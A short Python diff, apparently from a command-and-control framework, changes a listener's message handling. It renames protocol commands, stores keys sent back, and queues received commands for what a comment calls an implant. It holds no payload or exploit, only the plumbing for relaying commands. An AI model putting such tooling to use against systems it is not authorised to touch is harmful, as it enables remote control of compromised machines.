@@ -56,6 +56,12 @@ def initialized(frame, listener):
     return reply_frame
 
 
+def noop(frame, listener):
+    reply_frame = None
+    listener.ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][0]['tpk']))
+    return reply_frame
+
+
 def request_command(listener):
     """
     RECEIVES: None
@@ -65,7 +71,7 @@ def request_command(listener):
     :param listener:
     :return:
     """
-    data = {'component_id': listener.component_id, "cmd": "lpi", "args":[{"gcmd": listener.initial_public_key._public_key}]}
+    data = {'component_id': listener.component_id, "cmd": "gcmd", "args":[{"gcmd": listener.initial_public_key._public_key}]}
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(listener, instruction_frame)
     return reply_frame
@@ -73,6 +79,9 @@ def request_command(listener):
 
 def receive_command(frame, listener):
     # TODO: add the command to the implant's queue
-    reply_frame = {"tid": frame['transaction_id']}
+    reply_frame = {"txid": frame['txid'], "cmd": "rcok", "args":[{"lpk": listener.initial_public_key._public_key}]}
+    for command in frame['args'][0]:
+        listener.cmd_queue.append(command)
+    listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['tpk']))
     reply_frame = transmit.cook_transmit_frame(listener, reply_frame)
     return reply_frame
